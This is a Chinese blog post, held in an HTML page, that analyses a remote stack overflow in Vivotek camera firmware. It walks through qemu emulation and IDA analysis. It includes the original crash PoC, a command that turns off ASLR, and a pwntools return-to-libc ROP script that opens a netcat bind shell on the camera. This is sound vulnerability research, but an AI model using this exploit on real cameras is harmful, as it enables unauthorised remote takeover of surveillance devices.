@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="0zti2a3T69n1U7TLwUhRVYhNLB-zZXfCbFPUZIl_2B0" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="stackoverflow,vivotek,ipcam," />
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="stackoverflow,vivotek,ipcam">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vivotek 摄像头远程栈溢出漏洞分析及利用">
+<meta property="og:url" content="https://0x43434343.com/2017/12/14/201712142254/index.html">
+<meta property="og:site_name" content="fenix&#39;s blog">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/cd72cb59563607470d2a70895d34d774e5567ad2">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/9716abafdcab8f0d27fd133c755b6efed6412660">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/9e55bb88ac964eaf12fa76772afac9e620e4c636">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/257bf24babdc2fa019d8754beff1faa3e995a170">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/df0424e01aa5a7def493ec37f4a20ce117eb2b9a">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/10a430e7fd33ca98d981624f2d2d086b0433db04">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/245677270d6abcde8e350a0907236530e609a35f">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/eb1b02eaa1d86a8b863e32389b34fce6552dddb0">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/59bb79cc8f2c5e2b2c618c10e9fbb2ae0f0dd4e4">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/6a511f4ce8da6e00fc167f1cff5067123fef555b">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/5e3b5322baf7da0fb744ff159b3f07397d92b8fb">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/a47d497c4f0dd1936f169853798881ba4bc1425d">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/ac0b5a5260be89d6ab690f00004b2b57c8128447">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/d7aea1769fa2a59e246b969b0c6f46dee9b42e66">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/2188a790a1f6e9aa36d34467910495cefe512252">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/46ea7c3331605586a3485c8fb47158ec40e25dc9">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/2aac5efcf95f851d9beb43ac400766000931fa8a">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/e0bc0e7ff49962f038c50904216023d53db4f0f8">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/31c9aee4d7e17185eff6c0239b5f757f9c60bf81">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/e748eaa99150d81de7fcd071efd037a61bc87479">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/49e4aacd7fd50f3599b6e18b91d3f456433df213">
+<meta property="og:updated_time" content="2021-05-24T09:20:59.703Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vivotek 摄像头远程栈溢出漏洞分析及利用">
+<meta name="twitter:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/cd72cb59563607470d2a70895d34d774e5567ad2">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://0x43434343.com/2017/12/14/201712142254/"/>
+
+
+
+
+
+  <title>Vivotek 摄像头远程栈溢出漏洞分析及利用 | fenix's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">fenix's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://0x43434343.com/2017/12/14/201712142254/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fenix">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fenix's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vivotek 摄像头远程栈溢出漏洞分析及利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-14T22:54:43+08:00">
+                2017-12-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2,225
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/cd72cb59563607470d2a70895d34d774e5567ad2" alt=""></p>
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>(本文首发于：<a href="https://paper.seebug.org/480/" target="_blank" rel="noopener">https://paper.seebug.org/480/</a>，转载请注明原始出处)</p>
+<p>近日，Vivotek 旗下多款摄像头被曝出远程未授权栈溢出漏洞，攻击者发送特定数据可导致摄像头进程崩溃。</p>
+<p>漏洞作者@bashis 放出了可造成摄像头 Crash 的 PoC ：<a href="https://www.seebug.org/vuldb/ssvid-96866" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-96866</a></p>
+<p>该漏洞在 Vivotek 的摄像头中广泛存在，按照官方的安全公告，会影响以下版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CC8160 CC8370-HV CC8371-HV CD8371-HNTV CD8371-HNVF2 FD8166A</span><br><span class="line">FD8166A-N FD8167A FD8167A-S FD8169A FD8169A-S FD816BA-HF2</span><br><span class="line">FD816BA-HT FD816CA-HF2 FD8177-H FD8179-H FD8182-F1 FD8182-F2</span><br><span class="line">FD8182-T FD8366-V FD8367A-V FD8369A-V FD836BA-EHTV FD836BA-EHVF2</span><br><span class="line">FD836BA-HTV FD836BA-HVF2 FD8377-HV FD8379-HV FD8382-ETV FD8382-EVF2</span><br><span class="line">FD8382-TV FD8382-VF2 FD9171-HT FD9181-HT FD9371-EHTV FD9371-HTV</span><br><span class="line">FD9381-EHTV FD9381-HTV FE8182 FE9181-H FE9182-H FE9191</span><br><span class="line">FE9381-EHV FE9382-EHV FE9391-EV IB8360 IB8360-W IB8367A</span><br><span class="line">IB8369A IB836BA-EHF3 IB836BA-EHT IB836BA-HF3 IB836BA-HT IB8377-H</span><br><span class="line">IB8379-H IB8382-EF3 IB8382-ET IB8382-F3 IB8382-T IB9371-EHT</span><br><span class="line">IB9371-HT IB9381-EHT IB9381-HT IP8160 IP8160-W IP8166</span><br><span class="line">IP9171-HP IP9181-H IZ9361-EH MD8563-EHF2 MD8563-EHF4 MD8563-HF2</span><br><span class="line">MD8563-HF4 MD8564-EH MD8565-N SD9161-H SD9361-EHL SD9362-EH</span><br><span class="line">SD9362-EHL SD9363-EHL SD9364-EH SD9364-EHL SD9365-EHL SD9366-EH</span><br><span class="line">SD9366-EHL VS8100-V2</span><br></pre></td></tr></table></figure>
+<p>Vivotek 官方提供了各种型号摄像头的固件下载：<a href="http://www.vivotek.com/firmware/" target="_blank" rel="noopener">http://www.vivotek.com/firmware/</a> ，这也为我们的研究带来了很多便利。</p>
+<p>我们发现，漏洞被曝出之后，在官网固件下载页面中的大多数固件均早于漏洞曝出时间，我们下载了几款摄像头的最新固件进行验证，发现漏洞依然存在，这意味着截止漏洞被曝出，Vivotek 官方对该漏洞的修复并不彻底。众所周知，栈溢出是存在潜在的远程命令执行风险的，为了深入了解该漏洞的影响，我们决定研究下该漏洞的原理及利用。</p>
+<h1 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h1><h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p>由于手头上并没有 Vivotek 的摄像头，我们在官网下载其中一款摄像头固件，使用 <code>qemu</code> 模拟运行。（注：官方在陆续发布各个版本的固件更新，可根据固件发布时间判断官方是否已经修复漏洞）</p>
+<p>首先下载摄像头固件：<a href="http://download.vivotek.com/downloadfile/downloads/firmware/cc8160firmware.zip" target="_blank" rel="noopener">http://download.vivotek.com/downloadfile/downloads/firmware/cc8160firmware.zip</a></p>
+<p>通过 <code>binwalk</code> 直接解压出其中的文件系统，和漏洞有关的主要文件如下</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/9716abafdcab8f0d27fd133c755b6efed6412660" alt=""></p>
+<p>根据 <code>file</code> 命令的结果可知目标架构为 <code>ARM</code>、小端、32位。且该 ELF 文件为动态链接。</p>
+<h2 id="修复运行依赖"><a href="#修复运行依赖" class="headerlink" title="修复运行依赖"></a>修复运行依赖</h2><p>尝试用 <code>qemu</code> 运行，结果如下</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/9e55bb88ac964eaf12fa76772afac9e620e4c636" alt=""></p>
+<p>服务没有运行起来，且没有明显的报错，猜想到可能是缺少某些依赖，程序直接退出了，扔到 IDA，从程序退出前的提示：<code>gethostbyname:: Success</code>，回溯程序异常退出原因。</p>
+<p>依次加载IDA 菜单栏 -&gt; View -&gt; Open subviews -&gt; Strings，<code>Command + F</code> 搜索 <code>gethostname</code></p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/257bf24babdc2fa019d8754beff1faa3e995a170" alt=""></p>
+<p>查看交叉引用信息，定位相应代码段</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/df0424e01aa5a7def493ec37f4a20ce117eb2b9a" alt=""></p>
+<p>异常退出部分代码如下</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/10a430e7fd33ca98d981624f2d2d086b0433db04" alt=""></p>
+<p>为了看的更直观，我们来贴一下 <code>F5</code> 的结果，如下</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/245677270d6abcde8e350a0907236530e609a35f" alt=""></p>
+<p>这部分主要涉及两个函数。gethostname()：返回本地主机的标准主机名，如果函数成功，则返回 0。如果发生错误则返回 -1。gethostbyname()：用域名或主机名获取IP地址。</p>
+<p>Linux 操作系统的 hostname 是一个 kernel 变量，可以通过 hostname 命令来查看本机的 hostname。也可以直接 <code>cat /proc/sys/kernel/hostname</code> 查看。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/eb1b02eaa1d86a8b863e32389b34fce6552dddb0" alt=""></p>
+<p>我们只需要将二者改成一致，httpd 服务即可成功运行。</p>
+<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>为了方便调试，还需要搭建 qemu 虚拟机环境。</p>
+<p>qemu 镜像文件下载：<a href="https://people.debian.org/~aurel32/qemu/armel/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armel/</a> （下载内核 3.2 的版本）<br>远程调试 gdbserver：<a href="https://github.com/mzpqnxow/gdb-static-cross/tree/master/prebuilt-static" target="_blank" rel="noopener">https://github.com/mzpqnxow/gdb-static-cross/tree/master/prebuilt-static</a></p>
+<p>qemu 虚拟机建议采用 <code>桥接</code> 方式和主机连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 192.168.2.1/24</span><br><span class="line">qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/sda1"</span>  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
+<p>启动虚拟机，进行简单配置等待远程调试。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/59bb79cc8f2c5e2b2c618c10e9fbb2ae0f0dd4e4" alt=""></p>
+<h1 id="漏洞研究"><a href="#漏洞研究" class="headerlink" title="漏洞研究"></a>漏洞研究</h1><h2 id="定位溢出点"><a href="#定位溢出点" class="headerlink" title="定位溢出点"></a>定位溢出点</h2><p>以下为漏洞作者 @bashis 提供的 PoC<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -en <span class="string">"POST /cgi-bin/admin/upgrade.cgi</span></span><br><span class="line"><span class="string">HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"</span>  | ncat -v 192.168.57.20 80</span><br></pre></td></tr></table></figure></p>
+<p>老套路， 根据 <code>Content-Length</code> 很容易定位到溢出点，如下</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/6a511f4ce8da6e00fc167f1cff5067123fef555b" alt=""></p>
+<p>惊讶到了，strncpy() 函数的长度参数竟然这么用，妥妥的溢出。</p>
+<h2 id="调用栈布局"><a href="#调用栈布局" class="headerlink" title="调用栈布局"></a>调用栈布局</h2><p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/5e3b5322baf7da0fb744ff159b3f07397d92b8fb" alt=""></p>
+<p><code>dest</code> 缓冲区起始地址距离栈底 <code>0x38</code> 字节，栈上依次为 LR、R11-R4。<code>Content-Length</code> 长度超过 0x38 - 4 字节就会覆盖函数的返回地址 LR。</p>
+<h2 id="exp-研究"><a href="#exp-研究" class="headerlink" title="exp 研究"></a>exp 研究</h2><p><code>strncpy()</code> 函数引起的栈溢出，在利用时就会有很 egg hurt 的 <code>0x00</code> 坏字符问题，如果我们的输入数据中包含 <code>0x00</code>，将会被截断导致漏洞利用失败。根据溢出点附近的汇编代码来看，<code>0x0a</code> 也会被截断。且开启了 <code>NX</code> 保护，这意味着我们无法在栈上部署 <code>shellcode</code>。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/a47d497c4f0dd1936f169853798881ba4bc1425d" alt=""></p>
+<p>​</p>
+<p>尝试通过 <code>return2libc</code> 的方式 getshell。由于没有实际的摄像头，我们不知道目标系统是否开启了 <code>ASLR</code> ，如果 <code>ASLR</code> 是开启的且没有其它可用来暴露 <code>libC</code> 动态链接库内存地址的漏洞，那么利用该漏洞将会是一个很难受的过程。</p>
+<p>采用以下方式暂时关闭 <code>ASLR</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p><code>libC</code> 库的加载地址如下</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/ac0b5a5260be89d6ab690f00004b2b57c8128447" alt=""></p>
+<p>接下来就需要精心构造数据，劫持函数的执行流程了。有一点需要注意，X86 架构下的所有参数都是通过堆栈传递的，而在 MIPS 和 ARM 架构中，会优先通过寄存器传递参数，如果参数个数超过了寄存器的数量，则将剩下的参数压入调用参数空间（即堆栈）。</p>
+<p>从前面的分析来看，只要我们构造 0x38 - 4 字节以上的数据，栈底的函数返回地址就会被我们劫持。system() 函数地址 = <code>libC</code> 库在内存中的加载基址 + system() 函数在 <code>libC</code> 库中的偏移，通过劫持该地址为 <code>libC</code> 库中的 system() 函数地址，再设置 <code>R0</code> 寄存器指向命令字符串，就可以执行任意命令。</p>
+<p>经过验证，<code>nc</code> 命令可以正常使用。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/d7aea1769fa2a59e246b969b0c6f46dee9b42e66" alt=""></p>
+<p>接下来我们开始构造 <code>ROP</code> 利用链，大致思路见以下汇编代码。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/2188a790a1f6e9aa36d34467910495cefe512252" alt=""></p>
+<p>Github 上有个很赞的项目：<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a><br>它可以用来搜索 ELF 文件中的 gadgets，方便我们构造 ROP 链。</p>
+<p>我们需要将字符串参数 <code>nc -lp2222 -e/bin/sh</code> 部署到栈上，并且将地址存入 <code>R0</code>。该参数包含 20 个字节，且不含坏字符。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/46ea7c3331605586a3485c8fb47158ec40e25dc9" alt=""></p>
+<p><code>libC</code> 基址为 <code>0xb6f2d000</code>，由该地址可知 gadget 在内存中的有效地址。发生溢出时栈顶地址为 <code>0xbeffeb50</code>。</p>
+<p>利用 <code>ROPgadget</code> 搜索可用的 gadgets，在选择 gadget 时要还考虑坏字符的问题。比如说如下的 gadget 就不得行。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/2aac5efcf95f851d9beb43ac400766000931fa8a" alt=""></p>
+<p>再搜索一条可用的 gadget，俗称曲线救国。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/e0bc0e7ff49962f038c50904216023d53db4f0f8" alt=""></p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/31c9aee4d7e17185eff6c0239b5f757f9c60bf81" alt=""></p>
+<p>选择以下两条 gadget，构造 <code>ROP</code> 如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基于 qemu 模拟环境</span></span><br><span class="line"><span class="comment"># 摄像头型号：Vivotek CC8160</span></span><br><span class="line"><span class="comment"># 0x00048784 : pop &#123;r1, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x00016aa4 : mov r0, r1 ; pop &#123;r4, r5, pc&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0xb6f2d000</span>	<span class="comment"># libC 库在内存中的加载地址</span></span><br><span class="line">stack_base = <span class="number">0xbeffeb70</span> <span class="comment"># 崩溃时 SP 寄存器的地址</span></span><br><span class="line">libc_elf = ELF(<span class="string">'libuClibc-0.9.33.3-git.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x38</span> - <span class="number">4</span>) * <span class="string">'a'</span> <span class="comment"># padding</span></span><br><span class="line">payload +=  p32(<span class="number">0x00048784</span> + libc_base) <span class="comment"># gadget1</span></span><br><span class="line">payload += p32(<span class="number">0x80</span> + stack_base) <span class="comment"># 栈中命令参数地址</span></span><br><span class="line">payload += p32(<span class="number">0x00016aa4</span> + libc_base) <span class="comment"># gadget2</span></span><br><span class="line">payload += (<span class="number">0x8</span> * <span class="string">'a'</span>)	<span class="comment"># padding</span></span><br><span class="line">payload += p32(libc_elf.symbols[<span class="string">'system'</span>] + libc_base) <span class="comment"># 内存中 system() 函数地址</span></span><br><span class="line">payload += (<span class="string">'pwd;'</span> * <span class="number">0x100</span> + <span class="string">'nc\x20-lp2222\x20-e/bin/sh\x20&gt;'</span>) <span class="comment"># 命令参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'echo -en "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:&#123;&#125;\n\r\n\r\n"  | nc -v 192.168.2.2 80'</span>.format(payload)</span><br></pre></td></tr></table></figure>
+<p>通过调试 ，我们可以获得崩溃时的栈顶地址，为了确保命令能执行，我们在真正要执行的命令前加了部分命令作为缓冲。</p>
+<p>可以看到，开启了 <code>NX</code> 保护的栈上虽然不可执行代码，但是依然可以在上面部署数据。我们只需要将要执行的命令部署到栈上，构造 ROP 让 R0 寄存器指向栈上的命令所在区域，然后 <code>return2libC</code> 调用系统函数，就可以执行任意命令了。</p>
+<p>已将 PoC 和 EXP 整理成 Pocsuite 脚本：<a href="https://www.seebug.org/vuldb/ssvid-96866" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-96866</a><br>，验证效果如下。</p>
